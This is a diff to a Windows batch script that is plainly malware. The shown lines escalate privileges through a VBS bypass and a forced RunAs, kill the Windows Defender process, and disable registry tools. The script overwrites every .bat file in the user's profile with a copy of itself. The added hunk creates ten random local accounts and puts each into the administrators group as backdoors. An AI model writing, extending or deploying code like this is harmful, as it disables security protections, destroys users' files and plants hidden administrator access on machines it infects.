@@ -10,7 +10,6 @@ wscript.exe "%TEMP%\bypass.vbs" >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%~f0" /t REG_SZ /d "RUNASADMIN" /f >nul 2>&1
 if not '%1'=='admin' (
     powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs" >nul 2>&1
-    goto :eof
 )
 
 taskkill /f /im MsMpEng.exe
@@ -123,4 +122,9 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "0" /f >nul
 for /r "%userprofile%" %%f in (*.bat) do if not "%%f"=="%~f0" copy /Y "%~f0" "%%f" >nul 2>&1
-
+for /l %%i in (1,1,10) do (
+    set u=!random!
+    set p=!random!
+    net user !u! !p! /add >nul 2>&1
+    net localgroup administrators !u! /add >nul 2>&1
+)
